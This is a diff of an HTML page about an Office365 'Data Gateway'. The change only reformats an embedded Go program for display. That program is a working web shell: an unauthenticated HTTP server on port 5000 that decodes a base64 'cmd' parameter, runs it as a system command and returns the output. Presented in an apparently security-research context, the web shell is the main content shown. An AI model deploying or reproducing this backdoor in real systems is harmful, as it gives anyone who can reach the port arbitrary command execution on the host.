@@ -139,47 +139,47 @@
                         <h5 id="internal-data-gateway">Data Gateway</h5>
                         <p>Data Gateway's are fascinating...currently holding on releasing any additional information for personal reasons.</p>
                         <img src="../static/images/Office365/flow/data_gateway.png" alt="Data Gateway" class="img-fluid"><br />
-                        <br /><pre><code>package main
+                        <br /><pre><code>package main<br /><br/ >
 
-import (
-    "encoding/base64"
-    "fmt"
-    "log"
-    "net/http"
-    "os/exec"
-    "strings"
-)
-
-func runCommand(w http.ResponseWriter, r *http.Request) {
-    //Get the Parameter
-    //expected url is http://url/?cmd=cHdk
-    b64cmd := r.URL.Query()["cmd"]
-    data := string(b64cmd[0])
-    //Decode the b64 string error
-    sDec, err := base64.StdEncoding.DecodeString(data)
-    if err != nil {
-        return
-    }
-    //stringify, split, and execute the command
-    cmd := string(sDec)
-    args := strings.Split(cmd, " ")
-    cmdOutput, err := exec.Command(args[0], args[1:]...).Output()
-    if err != nil {
-        //panic("ruh roh")
-        return
-    }
-    //return the output
-    fmt.Fprintf(w, string(cmdOutput))
-}
-
-//Set listening port, and handle incoming requests
-func handleRequests() {
-    http.HandleFunc("/", runCommand)
-    log.Fatal(http.ListenAndServe(":5000", nil))
-}
-
-func main() {
-    handleRequests()
+import (<br/ >
+&emsp;"encoding/base64"<br/ >
+&emsp;"fmt"<br/ >
+&emsp;"log"<br/ >
+&emsp;"net/http"<br/ >
+&emsp;"os/exec"<br/ >
+&emsp;"strings"<br/ >
+)<br/ >
+<br/ >
+func runCommand(w http.ResponseWriter, r *http.Request) {<br/ >
+&emsp;//Get the Parameter<br/ >
+&emsp;//expected url is http://url/?cmd=cHdk<br/ >
+&emsp;b64cmd := r.URL.Query()["cmd"]<br/ >
+&emsp;data := string(b64cmd[0])<br/ >
+&emsp;//Decode the b64 string error<br/ >
+&emsp;sDec, err := base64.StdEncoding.DecodeString(data)<br/ >
+&emsp;if err != nil {<br/ >
+&emsp;&emsp;return<br/ >
+&emsp;}<br/ >
+&emsp;//stringify, split, and execute the command<br/ >
+&emsp;cmd := string(sDec)<br/ >
+&emsp;args := strings.Split(cmd, " ")<br/ >
+&emsp;cmdOutput, err := exec.Command(args[0], args[1:]...).Output()<br/ >
+&emsp;if err != nil {<br/ >
+&emsp;&emsp;//panic("ruh roh")<br/ >
+&emsp;&emsp;return<br/ >
+&emsp;}<br/ >
+&emsp;//return the output<br/ >
+&emsp;fmt.Fprintf(w, string(cmdOutput))<br/ >
+}<br/ >
+<br/ >
+//Set listening port, and handle incoming requests<br/ >
+func handleRequests() {<br/ >
+    http.HandleFunc("/", runCommand)<br/ >
+    log.Fatal(http.ListenAndServe(":5000", nil))<br/ >
+}<br/ >
+<br/ >
+func main() {<br/ >
+    handleRequests()<br/ >
 }</code></pre>
                         <hr>
                         <h3 id="security_controls">Security Controls</h3>
